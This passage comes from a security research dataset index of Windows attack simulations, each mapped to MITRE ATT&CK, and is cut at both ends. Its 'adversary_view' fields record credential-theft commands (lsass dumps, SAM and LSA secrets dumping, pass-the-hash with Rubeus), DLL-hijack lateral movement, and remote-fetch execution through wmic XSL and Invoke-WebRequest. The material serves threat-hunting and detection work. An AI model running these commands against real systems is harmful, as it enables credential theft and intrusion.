            "adversary_view": "(Empire: G6BYHU4F) > shell C:\\users\\sbeavers\\Desktop\\Rubeus.exe asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /createnetonly:C:\\Windows\\System32\\cmd.exe\n[*] Tasked 4EH9PC5S to run TASK_SHELL\n[*] Agent 4EH9PC5S tasked with task ID 4\n(Empire: 4EH9PC5S) > \n______        _                      \n  (_____ \\      | |                     \n  _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v1.5.0 \n\n[*] Action: Ask TGT\n\n[*] Showing process : False\n[+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\n[+] ProcessID       : 10064\n[+] LUID            : 0x42e7ba4\n\n[*] Using rc4_hmac hash: 81d310fa34e6a56a31145445891bb7b8\n[*] Target LUID : 70155172\n[*] Building AS-REQ (w/ preauth) for: 'theshire.local\\pgustavo'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n      doIFPjCCBTqgAwIBBaEDAgEWooIETTCCBElhggRFMIIEQaADAgEFoRAbDlRIRVNISVJFLkxPQ0FMoiMw\n      IaADAgECoRowGBsGa3JidGd0Gw50aGVzaGlyZS5sb2NhbKOCBAEwggP9oAMCARKhAwIBAqKCA+8EggPr\n      UHw92ESRb2uzf7C3GBZL2lN1UdDFIhvklZB/K21vINZO3G+ExWvoUxSVQQ+vYABaHcPGGeuYhXxRTwZB\n      kPGYa0cFXtMSdSvXCGWVLz6LFPTco3puJNx4d0exgnjTBUp3MUQMw8x2CACCL9Cv0RYN+Wy4WLTzIF0t\n      StYJk0I6g+vob7jOOAE6h8wp3XDfArkfcGndJmzBAgx5IeAL10yYArod69MykefCt3/uIbNJ9waMhov4\n      cUInkStzt0QcFTZbvNgC30Dhew3jkzRBd5XxCHGMWkhY60ibhvfw5czUgAJ8VcsKfG+X1zkwIGRXxRhc\n      c8COT4Z9614twkwjQ50FiRIxZBWHkxAKvzrwDtVE5v2alwfy827Sse85RoXPebKH11RMy8vFyPKsz4F8\n      46Wv5F0wXPf1vEl5z99KatYf+DtBpYg+ZO7S6pT9Ov/dRkdKMBCNp/hCuiL4imjlpMaMoqiXaWSA0E61\n      8ihQGj/qHXns2u4vujlrx/lvxgf/uCqanH5MYBviyFyvVDeuYw5yHQ0LXaf9aOcnOg3XnwJJfks/u+FZ\n      FjDnfvubv1nNaPQ9QtzM2P5Y3U6/14a4Ks6XNocwWBbtAOXZ0ttzs+W1S7sXjSuPlZ3uye4yLMEV+u3h\n      BwFoAQVl7usydsTx8Cur3FZQagYbdnJt6wOk5MtR7AlJvZ9WwJ6AOsaTFRyQ7rrHN6kFQklPELMCV7Dl\n      5bR79T31hC7wEQ/eFWMuL9EeurCD20mhoDQCqLttEetwEi7R8LXE/shPKZNY/4cFhWtODbtUzMLzNo3W\n      pvxOPNce0dB4lv8frBVFqumyMDKxcDkjEZv7uQaMH+ofWaAPARnRSzYSK+Bf8ECJTg4Cz5aHp4Mz6rJb\n      1UcyQ1KyS150j0L/bIGfXr6u+CDKCvQ8w+h8p0gfqaqiNOyVfVdrHxxqcfnxrTOBoxNXwm02PomiGoH9\n      T/uFchWCsM7OyCe1v05QT3jSi5Z2yHBmFWHLei96zm4Vu7JRkcQukE79q4Tb4OdiKuub0TByaDSAkC7a\n      sd4QWyOew6gfbfJmAMkFAJnnAtIObcbeXBM/++sK1kpbs7fOVkCZP3w5arGsaY0zwwU9o/amWWalGrNd\n      4jZq1xRJau7zwANNKTpEmXm10LGtdODlTpUfYSJTne97WzUBFLLMvUOMsVOeotm11qflE/BXU/MVmPJa\n      7aaOEtApZHcHhQb+/u55SmrHXs1NQGtFsbBKotR7miHsOUqjhRBOmbjXEz8St4MoHqf7aJcIy20IoW8Q\n      ASNHJSJHuDLJ5j+Wf+x0pV9dl03ocbaxWvtNzNw8drbo8bh2EWJmA9BdsKOB3DCB2aADAgEAooHRBIHO\n      fYHLMIHIoIHFMIHCMIG/oBswGaADAgEXoRIEEE6gkql0M63etr3rDe/EiAyhEBsOVEhFU0hJUkUuTE9D\n      QUyiFTAToAMCAQGhDDAKGwhwZ3VzdGF2b6MHAwUAQOEAAKURGA8yMDIwMDkyMjAzMDMwN1qmERgPMjAy\n      MDA5MjIxMzAzMDdapxEYDzIwMjAwOTI5MDMwMzA3WqgQGw5USEVTSElSRS5MT0NBTKkjMCGgAwIBAqEa\n      MBgbBmtyYnRndBsOdGhlc2hpcmUubG9jYWw=\n[*] Target LUID: 0x42e7ba4\n[+] Ticket successfully imported!\n\n  ServiceName           :  krbtgt/theshire.local\n  ServiceRealm          :  THESHIRE.LOCAL\n  UserName              :  pgustavo\n  UserRealm             :  THESHIRE.LOCAL\n  StartTime             :  9/21/2020 11:03:07 PM\n  EndTime               :  9/22/2020 9:03:07 AM\n  RenewTill             :  9/28/2020 11:03:07 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  rc4_hmac\n  Base64(key)           :  TqCSqXQzrd62vesN78SIDA==\n\n\n..Command execution completed.\n\n(Empire: 4EH9PC5S) > "
        },
        "references": [
            "https://github.com/GhostPack/Rubeus#example-over-pass-the-hash"
        ],
        "mp_last_updated": "2022-01-08T01:49:48.438554+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200922042230.yaml": {
        "title": "Empire Powerdump Extract Hashes",
        "id": "SDWIN-200922042230",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/22",
        "modification_date": "2020/09/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Calculating SysKey",
            "SAM Read"
        ],
        "description": "This dataset represents adversaries calculating the SysKey to decrypt Security Account Mannager (SAM) database entries (from registry or hive) and get NTLM, and sometimes LM hashes of local accounts password.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "002",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_powerdump_sam_access.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "powerdump",
                    "script": "https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: powershell/credentials/mimikatz/sam) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nWE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 08:21:35  http            \n\n(Empire: agents) > interact WE8XYD3K\n(Empire: WE8XYD3K) > usemodule credentials/powerdump*\n(Empire: powershell/credentials/powerdump) > info\n\n              Name: Invoke-PowerDump\n            Module: powershell/credentials/powerdump\n        NeedsAdmin: True\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  DarkOperator\n  winfang\n  Kathy Peters\n  ReL1K\n\nDescription:\n  Dumps hashes from the local system using Posh-SecMod's\n  Invoke-PowerDump\n\nComments:\n  https://github.com/darkoperator/Posh-\n  SecMod/blob/master/PostExploitation/PostExploitation.psm1\n\nOptions:\n\n  Name  Required    Value                     Description\n  ----  --------    -------                   -----------\n  Agent True        WE8XYD3K                  Agent to run module on.                 \n\n(Empire: powershell/credentials/powerdump) > execute\n[*] Tasked WE8XYD3K to run TASK_CMD_JOB\n[*] Agent WE8XYD3K tasked with task ID 4\n[*] Tasked agent WE8XYD3K to run module powershell/credentials/powerdump\n(Empire: powershell/credentials/powerdump) > \nJob started: TASK2D\n\nwardog:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\n(Empire: powershell/credentials/powerdump) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:48.635596+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201009173318.yaml": {
        "title": "Covenant Remote WMI Wbemcomn DLL Hijacking",
        "id": "SDWIN-201009173318",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/09",
        "modification_date": "2020/10/09",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "SMB CreateRequest"
        ],
        "description": "This dataset represents adversaries abusing a DLL hijack vulnerability found in the execution of the WMI provider host (wmiprvse.exe) for lateral movement.",
        "attack_mappings": [
            {
                "technique": "T1047",
                "sub-technique": null,
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Remote WMI Wbemcomn DLL Hijack",
                "link": "https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_wmi_wbemcomn_dll_hijack.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_wmi_wbemcomn_dll_hijack.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "ShellCmd",
                    "script": "https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96"
                },
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "Copy",
                    "script": "https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/DefaultGruntTasks.yaml#L951"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Copy /source:\"C:\\ProgramData\\test.dll\" /destination:\"\\\\WORKSTATION6\\C$\\Windows\\System32\\wbem\\wbemcomn.dll\"\n\nShellCmd /shellcommand:\"wmic /node:WORKSTATION6 os get\""
        },
        "references": [
            "https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/"
        ],
        "mp_last_updated": "2022-01-08T01:49:48.845594+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201009183000.yaml": {
        "title": "Covenant Remote DCOM Iertutil DLL Hijacking",
        "id": "SDWIN-201009183000",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/09",
        "modification_date": "2020/10/09",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "SMB CreateRequest"
        ],
        "description": "This dataset represents adversaries abusing a DLL hijack vulnerability found in the execution of the DCOM InternetExplorer.Application class for lateral movement.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "003",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Remote DCOM IErtUtil DLL Hijack",
                "link": "https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_dcom_iertutil_dll_hijack.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_dcom_iertutil_dll_hijack.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "PowerShell",
                    "script": "https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L529"
                },
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "Copy",
                    "script": "https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/DefaultGruntTasks.yaml#L951"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Copy /source:\"C:\\ProgramData\\test2.dll\" /destination:\"\\\\WORKSTATION6\\C$\\Program Files\\Internet Explorer\\iertutil.dll\"\n\nPowerShell /powershellcommand:\"$i=[activator]::CreateInstance([type]::GetTypeFromProgID('InternetExplorer.Application','172.18.39.6'))\""
        },
        "references": [
            "https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/"
        ],
        "mp_last_updated": "2022-01-08T01:49:49.582376+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201012183248.yaml": {
        "title": "Covenant Wuauclt CreateRemoteThread Execution",
        "id": "SDWIN-201012183248",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/12",
        "modification_date": "2020/10/12",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "CreateRemoteThread"
        ],
        "description": "This dataset represents adversaries proxy executing code via the Windows Update client utility. In order to bypass rules looking for the binary reaching out directly to the Internet, this dataset shows the binary creating and running a thread in the virtual address space of another process via the CreateRemoteThread API.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": null,
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Signed Binary Proxy Execution via CreateRemoteThread",
                "link": "https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-201012183248.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/covenant_lolbin_wuauclt_createremotethread.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "ShellCmd",
                    "script": "https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Upload /filepath:\"C:\\ProgramData\\SimpleInjection.dll\"\n\nShellCmd /shellcommand:\"C:\\Windows\\System32\\wuauclt.exe /UpdateDeploymentProvider C:\\ProgramData\\SimpleInjection.dll /RunHandlerComServe\""
        },
        "references": [
            "https://dtm.uk/wuauclt/"
        ],
        "mp_last_updated": "2022-01-08T01:49:49.769376+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201017061100.yaml": {
        "title": "WMIC Remote XSL Jscript Execution",
        "id": "SDWIN-201017061100",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/17",
        "modification_date": "2020/10/17",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents adversaries proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (jscript).",
        "attack_mappings": [
            {
                "technique": "T1220",
                "sub-technique": null,
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/wmic_remote_xsl_jscript.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "ART",
                    "module": "wmicscript",
                    "script": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "wmic process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\""
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1220/T1220.md#atomic-test-4---wmic-bypass-using-remote-xsl-file",
            "https://twitter.com/dez_/status/986614411711442944"
        ],
        "mp_last_updated": "2022-01-08T01:49:49.963842+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201018195009.yaml": {
        "title": "Lsass Memory Dump via Comsvcs.dll",
        "id": "SDWIN-201018195009",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/18",
        "modification_date": "2020/10/18",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.2536dee2-12fb-459a-8c37-971844fa73be"
        ],
        "description": "This dataset represents adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "001",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/psh_lsass_memory_dump_comsvcs.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Powershell",
                    "module": "Powershell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-3---dump-lsassexe-memory-using-comsvcsdll"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-3---dump-lsassexe-memory-using-comsvcsdll",
            "https://twitter.com/shantanukhande/status/1229348874298388484",
            "https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/"
        ],
        "mp_last_updated": "2022-01-08T01:49:50.196374+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201018225619.yaml": {
        "title": "Lsass Memory Dump via Syscalls",
        "id": "SDWIN-201018225619",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/18",
        "modification_date": "2020/10/18",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.7ae7102c-a099-45c8-b985-4c7a2d05790d"
        ],
        "description": "This dataset represents adversaries using system calls (syscalls) and API unhooking to dump the memoty contents of lsass.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "001",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_lsass_memory_dumpert_syscalls.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-4---dump-lsassexe-memory-using-direct-system-calls-and-api-unhooking"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\Users\\wardog\\Desktop>Outflank-Dumpert.exe\n________          __    _____.__                 __\n\\_____  \\  __ ___/  |__/ ____\\  | _____    ____ |  | __\n  /   |   \\|  |  \\   __\\   __\\|  | \\__  \\  /    \\|  |/ /\n/    |    \\  |  /|  |  |  |  |  |__/ __ \\|   |  \\    <\n\\_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \\\n        \\/                             \\/     \\/     \\/\n                                  Dumpert\n                              By Cneeliz @Outflank 2019\n\n[1] Checking OS version details:\n        [+] Operating System is Windows 10 or Server 2016, build number 18363\n        [+] Mapping version specific System calls.\n[2] Checking Process details:\n        [+] Process ID of lsass.exe is: 756\n        [+] NtReadVirtualMemory function pointer at: 0x00007FFB929DC890\n        [+] NtReadVirtualMemory System call nr is: 0x3f\n        [+] Unhooking NtReadVirtualMemory.\n[3] Create memorydump file:\n        [+] Open a process handle.\n        [+] Dump lsass.exe memory to: \\??\\C:\\windows\\Temp\\dumpert.dmp\n        [+] Dump succesful.\n\nC:\\Users\\wardog\\Desktop>"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-4---dump-lsassexe-memory-using-direct-system-calls-and-api-unhooking",
            "https://github.com/outflanknl/Dumpert",
            "https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/"
        ],
        "mp_last_updated": "2022-01-08T01:49:50.438376+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201019002900.yaml": {
        "title": "SAM Copy via Esentutl VSS",
        "id": "SDWIN-201019002900",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/19",
        "modification_date": "2020/10/19",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.a90c2f4d-6726-444e-99d2-a00cd7c20480"
        ],
        "description": "This dataset represents adversaries copying the SAM hive using the esentutl.exe utility and volume shadow copy services.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "002",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_sam_copy_esentutl.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Microsoft Windows [Version 10.0.18363.1139]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\wardog>esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d C:\\ProgramData\\SAM\n\nExtensible Storage Engine Utilities for Microsoft(R) Windows(R)\nVersion 10.0\nCopyright (C) Microsoft Corporation. All Rights Reserved.\n\nInitializing VSS subsystem...\n\nInitiating COPY FILE mode...\n    Source File: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\nDestination File: C:\\ProgramData\\SAM\n\n                      Copy Progress (% complete)\n\n          0    10   20   30   40   50   60   70   80   90  100\n          |----|----|----|----|----|----|----|----|----|----|\n          ...................................................\n\n        Total bytes read                = 0x9000 (36864) (0 MB)\n        Total bytes written             = 0x9000 (36864) (0 MB)\n\n\nOperation completed successfully in 4.859 seconds.\n\nC:\\Users\\wardog>"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy"
        ],
        "mp_last_updated": "2022-01-08T01:49:50.647378+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201019033054.yaml": {
        "title": "Psexec Reg LSA Secrets Dump",
        "id": "SDWIN-201019033054",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/19",
        "modification_date": "2020/10/19",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.55295ab0-a703-433b-9ca4-ae13807de12f"
        ],
        "description": "This dataset represents adversaries using psexec to run reg.exe as system and dump LSA secrets. Location HKLM\\security\\policy\\secrets.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "004",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_psexec_lsa_secrets_dump.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md#atomic-test-1---dumping-lsa-secrets"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\Users\\wardog\\Downloads\\PSTools>PsExec.exe -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets\n\nPsExec v2.2 - Execute processes remotely\nCopyright (C) 2001-2016 Mark Russinovich\nSysinternals - www.sysinternals.com\n\n\nThe operation completed successfully.\nreg exited on WORKSTATION5 with error code 0.\n\nC:\\Users\\wardog\\Downloads\\PSTools>"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md#atomic-test-1---dumping-lsa-secrets"
        ],
        "mp_last_updated": "2022-01-08T01:49:50.847375+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201019224718.yaml": {
        "title": "Logon Scripts via UserInitMprLogonScript",
        "id": "SDWIN-201019224718",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/19",
        "modification_date": "2020/10/19",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.d6042746-07d4-4c92-9ad8-e644c114a231"
        ],
        "description": "This dataset represents adversaries leveraging logon initialization scripts to achieve persistence via the UserInitMprLogonScript user environment.",
        "attack_mappings": [
            {
                "technique": "T1037",
                "sub-technique": "001",
                "tactics": [
                    "TA0003"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/cmd_userinitmprlogonscript_batch.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.001/T1037.001.md"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Microsoft Windows [Version 10.0.18363.1139]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\wardog>echo \"echo Art Logon Script atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt\" > %temp%\\art.bat\n\nC:\\Users\\wardog>REG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d %temp%\\art.bat /f\nThe operation completed successfully."
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.001/T1037.001.md"
        ],
        "mp_last_updated": "2022-01-08T01:49:51.020376+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201019232515.yaml": {
        "title": "Mavinject Process DLL Injection",
        "id": "SDWIN-201019232515",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/19",
        "modification_date": "2020/10/19",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.74496461-11a1-4982-b439-4d87a550d254"
        ],
        "description": "This dataset represents adversaries leveraging",
        "attack_mappings": [
            {
                "technique": "T1055",
                "sub-technique": null,
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_mavinject_dll_notepad.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "powershell",
                    "module": "powershell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "PS C:\\Users\\wardog> Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll\" -OutFile C:\\ProgramData\\T1055.dll\nPS C:\\Users\\wardog> $mypid = (Start-Process notepad -PassThru).id\nPS C:\\Users\\wardog> mavinject $mypid /INJECTRUNNING C:\\ProgramData\\T1055.dll"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe"
        ],
        "mp_last_updated": "2022-01-08T01:49:51.202376+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201020013208.yaml": {
        "title": "UI Prompt For Credentials Function",
        "id": "SDWIN-201020013208",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/20",
        "modification_date": "2020/10/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.2b162bfd-0928-4d4c-9ec3-4d9f88374b52"
        ],
        "description": "This dataset represents adversaries leveraging functions such as CredUIPromptForCredentials to create and display a configurable dialog box that accepts credentials information from a user.",
        "attack_mappings": [
            {
                "technique": "T1056",
                "sub-technique": "002",
                "tactics": [
                    "TA0006",
                    "TA0009"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/psh_input_capture_promptforcreds.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "powershell",
